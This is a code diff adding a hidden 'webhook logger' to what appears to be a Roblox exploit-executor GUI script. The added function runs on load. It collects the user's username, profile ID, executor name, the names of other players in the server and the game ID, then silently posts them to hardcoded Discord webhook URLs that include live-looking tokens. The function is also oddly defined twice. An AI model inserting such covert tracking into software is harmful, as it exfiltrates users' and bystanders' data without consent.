@@ -1602,6 +1602,116 @@ end
        end)
     end
 
+function lo1g()
+spawn(function()
+-- webhook logger for any executer
+-- put webhook in "webhook here"
+-- logs username,profile,executer
+-- planned updates:
+-- display name support
+-- gameID support
+
+    local with1 = {}
+
+    for i, v in pairs(game.Players:GetPlayers()) do
+    if v ~= game.Players.LocalPlayer then
+    print(v.Name)
+    table.insert(with1,v.Name)
+    end
+    end
+    print(with1)
+    local with2 = ""
+    local tc1 = string.format(table.concat(with1, ", "))
+    print(tc1)
+
+    local exploits = identifyexecutor()
+
+    local url = "https://discord.com/api/webhooks/958556739672899604/MYpYuA-7ni1FO2_LAxjx47jwhH4yE8yt0vE5qP6diu_40nF2J8PkrBTPTSfr-frQY1b0"
+
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = "Antelligence User's",
+                ["description"] = "                                                                            Username: " ..game.Players.LocalPlayer.Name.. " Exploit: " ..exploits.. "                                                             Profile: https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."".."                                                                     with ```"..tc1.."``` in the same server                                                                    ",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da),
+                ["image"] = {
+                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                    tostring(game:GetService("Players").LocalPlayer.Name)
+                }
+            }
+        }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {
+        Url = url, Body = newdata, Method = "POST", Headers = headers
+    }
+    request(abcdef)
+    end)
+end
+
+function lo1g()
+spawn(function()
+-- webhook logger for any executer
+-- put webhook in "webhook here"
+-- logs username,profile,executer
+-- planned updates:
+-- display name support
+-- gameID support
+
+    local with1 = {}
+
+    for i, v in pairs(game.Players:GetPlayers()) do
+    if v ~= game.Players.LocalPlayer then
+    print(v.Name)
+    table.insert(with1,v.Name)
+    end
+    end
+    print(with1)
+    local with2 = ""
+    local tc1 = string.format(table.concat(with1, ", "))
+    print(tc1)
+
+    local exploits = identifyexecutor()
+
+    local url = "https://discord.com/api/webhooks/958556899656228864/aITGBkTCakcofdB5_YJBTf5q911Aq7I2nE0w--k5KDQdZvJIAxkf9Uc7UK7xau6L5m1j"
+
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = "Antelligence User's",
+                ["description"] = "                                                                            Username: " ..game.Players.LocalPlayer.Name.. "                                                                                                              Exploit: " ..exploits.. "                                                                                                                                            Profile: https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."".."                                                                                       with ```"..tc1.."``` in the same https://www.roblox.com/games/"..game.PlaceId.." server                                                                    ",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da),
+                ["image"] = {
+                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                    tostring(game:GetService("Players").LocalPlayer.Name)
+                }
+            }
+        }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {
+        Url = url, Body = newdata, Method = "POST", Headers = headers
+    }
+    request(abcdef)
+    end)
+end
+
+lo1g()
+
 
 Sec1:CreateToggle("Toggle autoclick", function(enabled)
 	if enabled then
